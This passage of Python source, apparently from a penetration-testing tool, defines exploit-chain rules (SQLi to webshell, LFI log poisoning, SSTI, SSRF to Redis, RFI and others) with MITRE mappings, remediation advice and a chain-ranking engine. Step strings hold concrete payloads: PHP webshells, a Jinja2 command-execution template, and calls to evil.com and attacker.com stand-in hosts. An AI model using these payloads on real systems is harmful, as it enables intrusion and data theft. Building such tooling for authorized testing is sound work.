        "confidence": 0.80,
        "impact":    "JavaScript payload performs state-changing request on behalf of authenticated admin, bypassing CSRF protection.",
        "steps": [
            ChainStep(1, "Confirm XSS (reflected or stored) and identify target admin action endpoint", ["xss_reflected", "xss_stored"], "xsstrike", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Check admin endpoint for CSRF protection (token missing / bypassable)",       ["csrf"],           "csrf_analyzer",      "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(3, "Craft XSS payload that submits the CSRF form using fetch() with credentials", [],                 "browser_execute_js", "TA0002_Execution",         "T1059.007", ""),
            ChainStep(4, "Deliver XSS to admin; action executes with admin privileges",                 [],                 "browser_auth_test",  "TA0004_Privilege_Escalation","T1134", ""),
        ],
        "tags":            ["xss", "csrf", "admin", "privilege-escalation"],
        "recommendations": ["Use SameSite=Strict cookies", "Require re-authentication for sensitive actions", "Implement robust CSRF token validation"],
    },

    {
        "id": "sqli_rce_via_file_write",
        "title": "SQL Injection → File Write → Webshell RCE",
        "triggers": ["sqli_error_based", "sqli_union_based", "sqli_blind_boolean", "sqli_time_based"],
        "requires":  [],
        "enhancers": ["info_disclosure"],
        "severity":  "CRITICAL",
        "cvss":      9.8,
        "confidence": 0.70,
        "impact":    "SQLi with FILE privilege allows writing a PHP webshell to the web root, achieving OS-level RCE.",
        "steps": [
            ChainStep(1, "Confirm UNION-based or stacked SQLi; check DB user has FILE privilege",      ["sqli_union_based", "sqli_error_based"], "sqlmap_attack", "TA0001_Initial_Access", "T1190", "SELECT user, file_priv FROM mysql.user"),
            ChainStep(2, "Determine web root path via @@datadir, LOAD_FILE('/etc/passwd'), or error messages", [], "sqlmap_attack", "TA0007_Discovery", "T1083", ""),
            ChainStep(3, "Write PHP webshell: SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'", [], "sqlmap_attack", "TA0002_Execution", "T1505.003", ""),
            ChainStep(4, "Execute commands via webshell: curl 'http://target/shell.php?cmd=id'",       [],                 "curl_request",       "TA0002_Execution",         "T1059.004", ""),
            ChainStep(5, "Upgrade to reverse shell; run linpeas for local privilege escalation",       [],                 "netcat_shell",       "TA0004_Privilege_Escalation","T1068",  ""),
        ],
        "tags":            ["sqli", "rce", "webshell", "mysql"],
        "recommendations": ["Run DB as least-privilege user (no FILE privilege)", "Use parameterized queries", "Disable INTO OUTFILE in MySQL config"],
    },

    {
        "id": "xxe_ssrf_internal",
        "title": "XXE → SSRF → Internal Service Access",
        "triggers": ["xxe"],
        "requires":  [],
        "enhancers": ["ssrf", "cloud_metadata"],
        "severity":  "CRITICAL",
        "cvss":      9.0,
        "confidence": 0.80,
        "impact":    "XXE allows reading files and making server-side requests to internal services, pivoting to credential access or RCE.",
        "steps": [
            ChainStep(1, "Confirm XXE via file read: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>",       ["xxe"],            "xxe_scanner",        "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(2, "Pivot to SSRF: use XXE to fetch http://169.254.169.254/ or internal services", ["xxe"],          "xxe_scanner",        "TA0007_Discovery",         "T1046",  "<!ENTITY ssrf SYSTEM 'http://internal-service/'>"),
            ChainStep(3, "Enumerate internal ports via XXE-SSRF (Blind: time-based, OOB via DTD)",      [],               "xxe_scanner",        "TA0007_Discovery",         "T1046",  "Use external DTD for OOB channel"),
            ChainStep(4, "Access internal admin APIs, metadata endpoints, or config files",             [],               "curl_request",       "TA0006_Credential_Access", "T1552",  ""),
            ChainStep(5, "Exfiltrate credentials / internal network topology",                          [],               "run_exploit_script", "TA0010_Exfiltration",      "T1048",  ""),
        ],
        "tags":            ["xxe", "ssrf", "internal", "oob"],
        "recommendations": ["Disable external entity processing in XML parser", "Use allow-list for XML input", "Block outbound requests from app server"],
    },

    {
        "id": "lfi_log_poison_rce",
        "title": "LFI → Log Poisoning → RCE",
        "triggers": ["lfi"],
        "requires":  [],
        "enhancers": ["info_disclosure"],
        "severity":  "CRITICAL",
        "cvss":      9.0,
        "confidence": 0.72,
        "impact":    "LFI used to include poisoned Apache/Nginx log file containing injected PHP code, achieving RCE.",
        "steps": [
            ChainStep(1, "Confirm LFI: ../../../../etc/passwd returns file content",                   ["lfi"],            "path_traversal_scanner", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Identify log file paths: /var/log/apache2/access.log, /var/log/nginx/access.log", [], "curl_request", "TA0007_Discovery", "T1083", ""),
            ChainStep(3, "Poison log via User-Agent: curl -A '<?php system($_GET[cmd]); ?>' http://target/", [], "curl_request", "TA0002_Execution", "T1505.003", "Inject PHP into User-Agent header"),
            ChainStep(4, "Include poisoned log via LFI: ?page=../../../../var/log/apache2/access.log&cmd=id", [], "curl_request", "TA0002_Execution", "T1059.004", ""),
            ChainStep(5, "RCE confirmed — upgrade to reverse shell",                                   [],                 "netcat_shell",       "TA0002_Execution",         "T1059.004", ""),
        ],
        "tags":            ["lfi", "log-poisoning", "rce", "php"],
        "recommendations": ["Disable allow_url_include and allow_url_fopen", "Use basename() to sanitize include paths", "Move log files outside web root"],
    },

    {
        "id": "ssti_rce",
        "title": "SSTI → Template Engine RCE",
        "triggers": ["ssti"],
        "requires":  [],
        "enhancers": [],
        "severity":  "CRITICAL",
        "cvss":      9.8,
        "confidence": 0.90,
        "impact":    "Template injection in Jinja2/Twig/Freemarker allows full OS command execution.",
        "steps": [
            ChainStep(1, "Confirm SSTI: {{7*7}} → 49 (Jinja2), #{7*7} → 49 (Ruby ERB)",              ["ssti"],           "tplmap_scan",        "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(2, "Fingerprint template engine: {{7*'7'}} → 7777777 (Jinja2) vs 49 (Twig)",   ["ssti"],           "tplmap_scan",        "TA0007_Discovery",         "T1082",  ""),
            ChainStep(3, "Jinja2 RCE: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", ["ssti"], "tplmap_scan", "TA0002_Execution", "T1059.004", ""),
            ChainStep(4, "Establish reverse shell from template engine context",                       [],                 "netcat_shell",       "TA0002_Execution",         "T1059.004", ""),
            ChainStep(5, "Escalate locally using linpeas / sudo enumeration",                          [],                 "linpeas_scan",       "TA0004_Privilege_Escalation","T1068",  ""),
        ],
        "tags":            ["ssti", "rce", "jinja2", "twig", "template"],
        "recommendations": ["Never pass user input directly to template render()", "Use sandboxed template environments", "Apply input validation before rendering"],
    },

    {
        "id": "idor_pii_breach",
        "title": "IDOR + Info Disclosure → Mass PII Data Breach",
        "triggers": ["idor_bola"],
        "requires":  [],
        "enhancers": ["info_disclosure", "bfla"],
        "severity":  "HIGH",
        "cvss":      8.5,
        "confidence": 0.85,
        "impact":    "Sequential IDOR allows bulk enumeration of all user records, exposing PII at scale.",
        "steps": [
            ChainStep(1, "Confirm IDOR: swap id=1 with id=2 and receive another user's data",          ["idor_bola"],      "idor_probe",         "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(2, "Enumerate all IDs 1..N in parallel to dump all user records",                ["idor_bola"],      "http_fuzz",          "TA0007_Discovery",         "T1087",  "Use ffuf/intruder for bulk enumeration"),
            ChainStep(3, "Extract emails, phone numbers, addresses, payment data",                     [],                 "http_request",       "TA0009_Collection",        "T1213",  ""),
            ChainStep(4, "If BFLA also present: promote own account to admin via /api/users/ID/role",  ["bfla"],           "idor_probe",         "TA0004_Privilege_Escalation","T1134", ""),
            ChainStep(5, "Combine with info_disclosure to find hidden admin endpoints",                ["info_disclosure"],"gobuster_scan",      "TA0007_Discovery",         "T1083",  ""),
        ],
        "tags":            ["idor", "bola", "pii", "data-breach"],
        "recommendations": ["Enforce object-level authorization on every API endpoint", "Use indirect references (GUIDs not sequential IDs)", "Implement rate limiting on enumerable endpoints"],
    },

    {
        "id": "file_upload_rce",
        "title": "Unrestricted File Upload → Webshell → RCE",
        "triggers": ["file_upload"],
        "requires":  [],
        "enhancers": ["info_disclosure"],
        "severity":  "CRITICAL",
        "cvss":      9.8,
        "confidence": 0.88,
        "impact":    "Uploading a PHP/JSP webshell and accessing it via URL achieves OS-level RCE.",
        "steps": [
            ChainStep(1, "Identify file upload endpoint; determine content-type/extension validation",  ["file_upload"],    "full_appsec_scan",   "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(2, "Bypass extension filter: try shell.php5, shell.phtml, shell.PHP, shell.php.jpg", ["file_upload"], "full_appsec_scan",  "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(3, "Upload webshell: <?php system($_GET['cmd']); ?>",                             [],                 "curl_request",       "TA0002_Execution",         "T1505.003", ""),
            ChainStep(4, "Locate uploaded file path (response body / X-Upload-Path header / gobuster)", [],                "gobuster_scan",       "TA0007_Discovery",         "T1083",  ""),
            ChainStep(5, "Execute: curl 'http://target/uploads/shell.php?cmd=id'",                      [],                "curl_request",        "TA0002_Execution",         "T1059.004", ""),
            ChainStep(6, "Establish persistent reverse shell; run linpeas",                             [],                "netcat_shell",        "TA0004_Privilege_Escalation","T1068",  ""),
        ],
        "tags":            ["file-upload", "rce", "webshell", "php"],
        "recommendations": ["Serve uploads from a different (non-executable) domain", "Validate MIME type server-side; rename uploads to UUID", "Disable PHP execution in upload directory"],
    },

    {
        "id": "subdomain_takeover_cookie",
        "title": "Subdomain Takeover → Cookie Scope → Session Hijack",
        "triggers": ["subdomain_takeover"],
        "requires":  [],
        "enhancers": ["cors_misconfiguration", "xss_reflected"],
        "severity":  "HIGH",
        "cvss":      7.5,
        "confidence": 0.78,
        "impact":    "Claimed dangling subdomain allows attacker to set cookies on the parent domain, hijacking authenticated sessions.",
        "steps": [
            ChainStep(1, "Identify CNAME pointing to unclaimed service (GitHub Pages, Heroku, Fastly…)", ["subdomain_takeover"], "cloudflair_scan", "TA0043_Reconnaissance", "T1596.001", ""),
            ChainStep(2, "Claim the subdomain on the third-party platform",                             ["subdomain_takeover"], "run_exploit_script","TA0001_Initial_Access",  "T1584",  "Register/claim the unclaimed service"),
            ChainStep(3, "Host JavaScript that sets Set-Cookie: session=evil; Domain=.target.com",      [],                 "run_exploit_script", "TA0006_Credential_Access", "T1539",  ""),
            ChainStep(4, "Send victim a link to the taken-over subdomain; cookie is set",               [],                 "browser_visit",      "TA0001_Initial_Access",    "T1566.002", ""),
            ChainStep(5, "Use the forged cookie to authenticate on the main application",               [],                 "browser_auth_test",  "TA0004_Privilege_Escalation","T1134", ""),
        ],
        "tags":            ["subdomain-takeover", "cookie", "session-hijack"],
        "recommendations": ["Remove dangling DNS records immediately", "Monitor CNAME targets; alert on 'no such account' responses", "Set cookie SameSite=Strict and Secure"],
    },

    {
        "id": "jwt_auth_bypass_admin",
        "title": "JWT Weakness → Auth Bypass → Admin Panel Access",
        "triggers": ["jwt_attack"],
        "requires":  [],
        "enhancers": ["bfla", "idor_bola"],
        "severity":  "CRITICAL",
        "cvss":      9.1,
        "confidence": 0.85,
        "impact":    "JWT alg:none or RS256→HS256 confusion allows forging tokens with arbitrary claims including admin roles.",
        "steps": [
            ChainStep(1, "Capture a valid JWT; decode to inspect header and claims",                   ["jwt_attack"],     "jwt_confusion_attack","TA0006_Credential_Access", "T1528",  ""),
            ChainStep(2, "Test alg:none: strip signature and set alg to 'none' in header",            ["jwt_attack"],     "jwt_tool_attack",    "TA0004_Privilege_Escalation","T1134", ""),
            ChainStep(3, "Test RS256→HS256 confusion: sign forged token with server's public key as HMAC secret", ["jwt_attack"], "jwt_tool_attack", "TA0004_Privilege_Escalation","T1134", ""),
            ChainStep(4, "Forge token with role:admin / is_admin:true / sub:<admin_user_id>",          [],                 "jwt_tool_attack",    "TA0004_Privilege_Escalation","T1134", ""),
            ChainStep(5, "Access admin panel / privileged endpoints with forged token",                [],                 "http_request",       "TA0002_Execution",         "T1078",  ""),
            ChainStep(6, "Chain with BFLA/IDOR to perform admin actions or extract all data",          ["bfla", "idor_bola"], "idor_probe",      "TA0007_Discovery",         "T1087",  ""),
        ],
        "tags":            ["jwt", "auth-bypass", "admin", "privilege-escalation"],
        "recommendations": ["Reject tokens with alg:none server-side", "Never use public key as HMAC secret", "Pin algorithm in JWT library configuration"],
    },

    {
        "id": "deserialization_rce_persistence",
        "title": "Deserialization → RCE → Backdoor Persistence",
        "triggers": ["deserialization"],
        "requires":  [],
        "enhancers": [],
        "severity":  "CRITICAL",
        "cvss":      9.8,
        "confidence": 0.82,
        "impact":    "Gadget chain exploitation achieves OS RCE; attacker establishes persistence via cron/service.",
        "steps": [
            ChainStep(1, "Identify deserialization point: serialized cookies (base64 rO0), request body, headers", ["deserialization"], "deserialization_probe", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Fingerprint platform/library (Java ysoserial, PHP, Python pickle, .NET)",    ["deserialization"], "deserialization_probe", "TA0007_Discovery", "T1082", ""),
            ChainStep(3, "Generate gadget chain payload: ysoserial CommonsCollections1 'curl evil.com'", [],              "run_exploit_script", "TA0002_Execution",         "T1059.004", ""),
            ChainStep(4, "Submit payload; confirm OOB callback to verify RCE",                         [],                "curl_request",        "TA0002_Execution",         "T1059.004", ""),
            ChainStep(5, "Upgrade to reverse shell; install cron or systemd backdoor",                 [],                "netcat_shell",        "TA0003_Persistence",       "T1053.003", ""),
        ],
        "tags":            ["deserialization", "rce", "java", "ysoserial", "persistence"],
        "recommendations": ["Do not deserialize untrusted data", "Use serialization allow-lists", "Deploy Java agent deserialization firewall (e.g., SerialKiller)"],
    },

    {
        "id": "race_condition_business_logic",
        "title": "Race Condition → Business Logic Bypass → Double Spend",
        "triggers": ["race_condition"],
        "requires":  [],
        "enhancers": [],
        "severity":  "HIGH",
        "cvss":      8.0,
        "confidence": 0.80,
        "impact":    "Concurrent requests exploit TOCTOU window: coupon applied multiple times, balance goes negative, single-use tokens consumed twice.",
        "steps": [
            ChainStep(1, "Identify single-use or quantity-limited action (coupon, withdrawal, vote)",  ["race_condition"], "race_condition_probe","TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(2, "Send 20–50 concurrent identical requests using Turbo Intruder / HTTP2 single-packet attack", ["race_condition"], "race_condition_probe", "TA0002_Execution", "T1499", ""),
            ChainStep(3, "Observe if action succeeds >1 time (coupon applied 3×, negative balance, extra item)", [],   "race_condition_probe","TA0002_Execution",         "T1499",  ""),
            ChainStep(4, "Repeat on higher-value endpoints: password reset tokens, referral bonuses",  [],                "race_condition_probe","TA0002_Execution",         "T1499",  ""),
        ],
        "tags":            ["race-condition", "business-logic", "double-spend", "toctou"],
        "recommendations": ["Use database-level atomic transactions / row locking", "Implement server-side rate limiting per user per action", "Validate token consumption atomically"],
    },

    {
        "id": "cors_cred_theft",
        "title": "CORS Misconfiguration → Cross-Origin Credential Read",
        "triggers": ["cors_misconfiguration"],
        "requires":  [],
        "enhancers": ["xss_reflected", "open_redirect"],
        "severity":  "HIGH",
        "cvss":      7.5,
        "confidence": 0.82,
        "impact":    "Wildcard or reflective ACAO with ACAC:true allows attacker's page to read authenticated API responses cross-origin.",
        "steps": [
            ChainStep(1, "Confirm: Origin: https://evil.com → ACAO: https://evil.com + ACAC: true",    ["cors_misconfiguration"], "cors_scan", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Host page on evil.com that executes: fetch('https://target/api/profile', {credentials:'include'})", [], "run_exploit_script", "TA0006_Credential_Access", "T1528", ""),
            ChainStep(3, "Deliver link to victim (phishing/XSS chain); steal API response",            [],                "browser_visit",       "TA0006_Credential_Access", "T1528",  ""),
            ChainStep(4, "Extract session token / PII / internal API data from response",              [],                "run_exploit_script",  "TA0010_Exfiltration",      "T1048",  ""),
        ],
        "tags":            ["cors", "credential-theft", "cross-origin"],
        "recommendations": ["Do not reflect arbitrary Origin headers", "Restrict CORS to specific trusted origins", "Never combine wildcard Origin with credentials:true"],
    },

    {
        "id": "mass_assignment_privesc",
        "title": "Mass Assignment → Role Escalation → Admin",
        "triggers": ["mass_assignment"],
        "requires":  [],
        "enhancers": ["bfla", "idor_bola"],
        "severity":  "HIGH",
        "cvss":      8.0,
        "confidence": 0.85,
        "impact":    "Hidden parameter injection sets is_admin:true or role:admin during account creation or update.",
        "steps": [
            ChainStep(1, "Identify registration/profile update endpoint; fuzz extra params",           ["mass_assignment"], "arjun_scan",         "TA0007_Discovery",         "T1592",  ""),
            ChainStep(2, "Inject role=admin, is_admin=true, or accountType=admin into request body",   ["mass_assignment"], "http_fuzz",          "TA0004_Privilege_Escalation","T1134", ""),
            ChainStep(3, "Verify escalation: call admin API endpoints with new session",               [],                 "http_request",        "TA0004_Privilege_Escalation","T1134", ""),
            ChainStep(4, "Chain with BFLA: invoke delete/modify operations normally restricted to admin", ["bfla"],        "idor_probe",          "TA0002_Execution",         "T1078",  ""),
        ],
        "tags":            ["mass-assignment", "privilege-escalation", "api"],
        "recommendations": ["Use allow-list approach for accepted fields (never block-list)", "Separate user-controlled and system-controlled attributes", "Validate role changes server-side only"],
    },

    {
        "id": "host_header_password_reset",
        "title": "Host Header Injection → Password Reset Poisoning → Account Takeover",
        "triggers": ["host_header_injection"],
        "requires":  [],
        "enhancers": [],
        "severity":  "HIGH",
        "cvss":      8.0,
        "confidence": 0.78,
        "impact":    "Password reset link generated using attacker-controlled Host header, intercepting victim's reset token.",
        "steps": [
            ChainStep(1, "Identify password reset endpoint; inject Host: evil.com",                    ["host_header_injection"], "host_header_injection", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Trigger password reset for victim account; reset email contains http://evil.com/reset?token=...", [], "curl_request", "TA0001_Initial_Access", "T1566.002", ""),
            ChainStep(3, "Victim clicks poisoned link; browser requests token from attacker's server", [],                "run_exploit_script",  "TA0006_Credential_Access", "T1528",  ""),
            ChainStep(4, "Use captured token to reset victim's password and take over account",        [],                "curl_request",        "TA0004_Privilege_Escalation","T1078", ""),
        ],
        "tags":            ["host-header", "password-reset", "account-takeover"],
        "recommendations": ["Use absolute base URL from config, never from request Host header", "Validate Host header against allow-list", "Log and alert on unusual Host values"],
    },

    {
        "id": "path_traversal_config_creds",
        "title": "Path Traversal → Config File Read → Credential Reuse",
        "triggers": ["path_traversal", "lfi"],
        "requires":  [],
        "enhancers": ["info_disclosure"],
        "severity":  "HIGH",
        "cvss":      7.5,
        "confidence": 0.80,
        "impact":    "Path traversal reads application config files containing DB passwords, API keys, or cloud credentials.",
        "steps": [
            ChainStep(1, "Confirm path traversal: ../../../../etc/passwd",                             ["path_traversal", "lfi"], "path_traversal_scanner", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Enumerate common config file paths: /var/www/html/config.php, ../../.env, web.config", [], "path_traversal_scanner", "TA0007_Discovery", "T1083", ""),
            ChainStep(3, "Read .env or config.php; extract DB_PASSWORD, SECRET_KEY, AWS_SECRET_KEY",  [],                "path_traversal_scanner","TA0006_Credential_Access", "T1552.001",""),
            ChainStep(4, "Use DB credentials to connect directly to exposed DB port (if open)",        [],                "sqlmap_attack",       "TA0007_Discovery",         "T1133",  ""),
            ChainStep(5, "Dump all credentials from the database; attempt credential reuse on other services", [],       "sqlmap_attack",       "TA0006_Credential_Access", "T1078",  ""),
        ],
        "tags":            ["path-traversal", "lfi", "config", "credential-reuse"],
        "recommendations": ["Validate and sanitize file path inputs strictly", "Store secrets in environment variables / vault, not config files", "Apply least-privilege file system permissions"],
    },

    {
        "id": "graphql_idor_data_exfil",
        "title": "GraphQL Introspection + IDOR → Bulk Data Exfiltration",
        "triggers": ["graphql_injection"],
        "requires":  [],
        "enhancers": ["idor_bola"],
        "severity":  "HIGH",
        "cvss":      7.8,
        "confidence": 0.80,
        "impact":    "Enabled introspection reveals all types/fields; combined with IDOR to batch-query all user records.",
        "steps": [
            ChainStep(1, "Run instrospection query: {__schema{types{name fields{name}}}}",             ["graphql_injection"], "graphql_probe",     "TA0043_Reconnaissance",    "T1592",  ""),
            ChainStep(2, "Map sensitive fields: email, password, token, credit_card",                  [],                 "graphql_probe",       "TA0007_Discovery",         "T1213",  ""),
            ChainStep(3, "Craft batched query to enumerate user IDs via IDOR: { user(id:1){ id email } }", ["idor_bola"],   "graphql_probe",       "TA0007_Discovery",         "T1087",  ""),
            ChainStep(4, "Dump all users using alias batching (1000 users per single request)",        [],                 "http_request",        "TA0009_Collection",        "T1213",  ""),
            ChainStep(5, "Exfiltrate bulk PII dataset",                                                [],                 "run_exploit_script",  "TA0010_Exfiltration",      "T1048",  ""),
        ],
        "tags":            ["graphql", "introspection", "idor", "data-exfiltration"],
        "recommendations": ["Disable introspection in production", "Implement per-field authorization checks", "Apply query depth and complexity limits"],
    },

    {
        "id": "prototype_pollution_xss",
        "title": "Prototype Pollution → Reflected XSS → Cookie Theft",
        "triggers": ["prototype_pollution"],
        "requires":  [],
        "enhancers": ["xss_reflected"],
        "severity":  "HIGH",
        "cvss":      7.5,
        "confidence": 0.72,
        "impact":    "Prototype pollution of Object.prototype allows injecting properties used as DOM sink inputs, resulting in XSS.",
        "steps": [
            ChainStep(1, "Confirm prototype pollution: __proto__[polluted]=1; check Object.prototype.polluted", ["prototype_pollution"], "prototype_pollution_scan", "TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Identify DOM sink that reads Object.prototype (innerHTML, eval, document.write)", [],  "browser_execute_js",  "TA0007_Discovery",         "T1082",  "Check client-side JS frameworks"),
            ChainStep(3, "Pollute with XSS payload: __proto__[innerHTML]=<img onerror=alert(1)/>",     [],                "browser_execute_js",  "TA0002_Execution",         "T1059.007", ""),
            ChainStep(4, "Escalate to cookie theft payload + phishing delivery",                       [],                "browser_execute_js",  "TA0006_Credential_Access", "T1539",  ""),
        ],
        "tags":            ["prototype-pollution", "xss", "javascript", "dom"],
        "recommendations": ["Use Object.create(null) for untrusted data objects", "Validate/sanitize query parameters before merging", "Apply DOM purification before assigning to sinks"],
    },

    {
        "id": "http_smuggling_request_hijack",
        "title": "HTTP Request Smuggling → Request Hijack → Stored XSS / Admin Access",
        "triggers": ["http_smuggling"],
        "requires":  [],
        "enhancers": ["xss_stored"],
        "severity":  "CRITICAL",
        "cvss":      9.0,
        "confidence": 0.68,
        "impact":    "Smuggled prefix is prepended to next victim's request, capturing their session or injecting malicious content.",
        "steps": [
            ChainStep(1, "Detect CL.TE / TE.CL discrepancy using timing-based probes",                ["http_smuggling"], "request_smuggling_probe","TA0001_Initial_Access", "T1190", ""),
            ChainStep(2, "Craft smuggled request that captures next request body",                     ["http_smuggling"], "http_smuggling_advanced","TA0006_Credential_Access","T1528",""),
            ChainStep(3, "Extract victim Authorization header / session cookie from captured body",    [],                "run_exploit_script",  "TA0006_Credential_Access", "T1528",  ""),
            ChainStep(4, "Alternatively: smuggle a request that poisons stored content with XSS",     ["xss_stored"],    "dalfox_scan",         "TA0002_Execution",         "T1059.007", ""),
            ChainStep(5, "Use hijacked session for admin access / data exfiltration",                  [],                "http_request",        "TA0004_Privilege_Escalation","T1078", ""),
        ],
        "tags":            ["http-smuggling", "request-hijack", "session-theft"],
        "recommendations": ["Normalise Transfer-Encoding handling in all proxy/server pairs", "Disable chunked encoding on front-end proxies", "Use HTTP/2 end-to-end where possible"],
    },

    {
        "id": "crlf_header_injection_cookie",
        "title": "CRLF Injection → Cookie Injection → Session Fixation",
        "triggers": ["crlf_injection"],
        "requires":  [],
        "enhancers": [],
        "severity":  "MEDIUM",
        "cvss":      6.5,
        "confidence": 0.78,
        "impact":    "CRLF characters in reflected URL parameters allow injecting arbitrary HTTP response headers including Set-Cookie.",
        "steps": [
            ChainStep(1, "Confirm CRLF: %0d%0aSet-Cookie: injected=1 reflected in response headers",  ["crlf_injection"],  "header_injection_scanner","TA0001_Initial_Access","T1190",""),
            ChainStep(2, "Inject Set-Cookie header to fix victim's session: ?x=%0d%0aSet-Cookie:session=attacker_known_id", [], "curl_request", "TA0001_Initial_Access", "T1190", "Send victim this URL pre-login"),
            ChainStep(3, "Victim logs in; attacker now knows their session ID (session fixation)",     [],                "browser_auth_test",   "TA0006_Credential_Access", "T1539",  ""),
            ChainStep(4, "Use fixed session to access account without knowing password",               [],                "http_request",        "TA0004_Privilege_Escalation","T1078", ""),
        ],
        "tags":            ["crlf", "header-injection", "session-fixation"],
        "recommendations": ["Encode \\r\\n in all reflected values", "Regenerate session ID on login", "Reject requests containing CRLF in URL parameters"],
    },

    {
        "id": "ssrf_internal_pivot_rce",
        "title": "SSRF → Internal Service Pivot → RCE via Redis/Memcached",
        "triggers": ["ssrf"],
        "requires":  [],
        "enhancers": [],
        "severity":  "CRITICAL",
        "cvss":      9.3,
        "confidence": 0.70,
        "impact":    "SSRF targets internal Redis/Memcached instances to write cron jobs or manipulate application state, leading to RCE.",
        "steps": [
            ChainStep(1, "Confirm SSRF; start enumerating internal services: http://localhost:6379/",  ["ssrf"],           "ssrf_scanner",        "TA0007_Discovery",         "T1046",  ""),
            ChainStep(2, "Detect Redis (banner: -ERR wrong number of arguments) or Memcached",         [],                "curl_request",        "TA0007_Discovery",         "T1046",  "Port scan: 6379, 11211, 8080, 9200"),
            ChainStep(3, "Redis exploit via SSRF: use Gopher protocol or dict:// to send raw Redis commands", [],        "curl_request",        "TA0002_Execution",         "T1059.004","gopher://127.0.0.1:6379/_SET cron..."),
            ChainStep(4, "Write Redis cron job: CONFIG SET dir /var/spool/cron; SET root \\n*/1 * * * * bash -i>...", [], "run_exploit_script", "TA0003_Persistence",       "T1053.003", ""),
            ChainStep(5, "Wait for cron execution; receive reverse shell",                             [],                "netcat_shell",        "TA0002_Execution",         "T1059.004", ""),
        ],
        "tags":            ["ssrf", "redis", "memcached", "rce", "gopher"],
        "recommendations": ["Bind Redis/Memcached to 127.0.0.1 only with auth", "Block internal IP ranges in SSRF-prone features", "Use network segmentation to isolate caching services"],
    },

    {
        "id": "rfi_webshell",
        "title": "Remote File Inclusion → Remote Webshell → Full System Compromise",
        "triggers": ["rfi"],
        "requires":  [],
        "enhancers": [],
        "severity":  "CRITICAL",
        "cvss":      9.8,
        "confidence": 0.85,
        "impact":    "RFI allows loading and executing a remotely-hosted PHP webshell, giving full OS access.",
        "steps": [
            ChainStep(1, "Confirm RFI: ?page=http://attacker.com/test.txt returns fetched content",    ["rfi"],            "path_traversal_scanner","TA0001_Initial_Access","T1190", ""),
            ChainStep(2, "Host PHP webshell: <?php system($_GET['c']); ?> at http://attacker.com/s.php", [],               "run_exploit_script",  "TA0002_Execution",         "T1505.003", ""),
            ChainStep(3, "Trigger: ?page=http://attacker.com/s.php",                                   [],                "curl_request",        "TA0002_Execution",         "T1059.004", ""),
            ChainStep(4, "Execute commands: ?page=http://attacker.com/s.php&c=id",                     [],                "curl_request",        "TA0002_Execution",         "T1059.004", ""),
            ChainStep(5, "Establish reverse shell; run post-exploitation enumeration",                  [],                "netcat_shell",        "TA0004_Privilege_Escalation","T1068",  ""),
        ],
        "tags":            ["rfi", "rce", "webshell", "php"],
        "recommendations": ["Disable allow_url_include in php.ini", "Restrict include/require to local paths only", "Validate include path against an allow-list"],
    },

    {
        "id": "nosqli_auth_bypass_data",
        "title": "NoSQL Injection → Auth Bypass → Database Dump",
        "triggers": ["nosql_injection"],
        "requires":  [],
        "enhancers": [],
        "severity":  "CRITICAL",
        "cvss":      9.1,
        "confidence": 0.80,
        "impact":    "MongoDB operator injection bypasses authentication; further injection dumps all collections.",
        "steps": [
            ChainStep(1, "Test: username[$ne]=invalid&password[$ne]=invalid on login endpoint",        ["nosql_injection"], "sqli_scanner",       "TA0001_Initial_Access",    "T1190",  ""),
            ChainStep(2, "Confirm auth bypass (logged in without valid credentials)",                   [],                "curl_request",        "TA0001_Initial_Access",    "T1078",  ""),
            ChainStep(3, "Enumerate collections via $where or regex operators",                         [],                "sqli_scanner",        "TA0007_Discovery",         "T1213",  ""),
            ChainStep(4, "Dump all documents: username[$regex]=.* to exfiltrate user data",            [],                "http_fuzz",           "TA0009_Collection",        "T1213",  ""),
        ],
        "tags":            ["nosqli", "mongodb", "auth-bypass"],
        "recommendations": ["Use ODM with parameterized queries", "Validate input types (reject objects for string fields)", "Implement operator allow-listing"],
    },

]


class ChainEngine:
    """
    Deterministic exploit chain engine (no LLM required).

    Given a list of confirmed vulnerability IDs from the KB, computes all
    applicable exploit chains and returns them ordered by severity/CVSS.
    """

    # Severity sort order
    _SEV_ORDER: Dict[str, int] = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

    def compute_chains(self, confirmed_vuln_ids: List[str]) -> List[ExploitChain]:
        """
        Return all applicable exploit chains given a list of confirmed vuln IDs.

        A chain fires when:
          - at least one item from `triggers` is in confirmed_vuln_ids, AND
          - all items in `requires` are in confirmed_vuln_ids (if requires is non-empty)
        """
        confirmed = {v.lower() for v in confirmed_vuln_ids}
        results: List[ExploitChain] = []

        for rule in _CHAIN_RULES:
            triggers = {t.lower() for t in rule["triggers"]}
            requires = {r.lower() for r in rule.get("requires", [])}
            enhancers = {e.lower() for e in rule.get("enhancers", [])}

            # Must have at least one trigger confirmed
            if not triggers.intersection(confirmed):
                continue
            # Must have all required vulns confirmed
            if requires and not requires.issubset(confirmed):
                continue

            # Boost confidence if enhancers are present
            base_confidence = rule["confidence"]
            bonus = 0.05 * len(enhancers.intersection(confirmed))
            final_confidence = min(base_confidence + bonus, 0.99)

            prerequisites = list(triggers.union(requires))

            chain = ExploitChain(
                id=rule["id"],
                title=rule["title"],
                severity=rule["severity"],
                cvss_estimate=rule["cvss"],
                impact=rule["impact"],
                confidence=round(final_confidence, 2),
                steps=rule["steps"],
                prerequisites=prerequisites,
                enhancers=list(rule.get("enhancers", [])),
                tags=rule["tags"],
                recommendations=rule["recommendations"],
            )
            results.append(chain)

        results.sort(
            key=lambda c: (
                self._SEV_ORDER.get(c.severity, 9),
                -c.cvss_estimate,
                -c.confidence,
            )
        )
        return results

    @staticmethod
    def format_chain(chain: ExploitChain, index: int = 1) -> str:
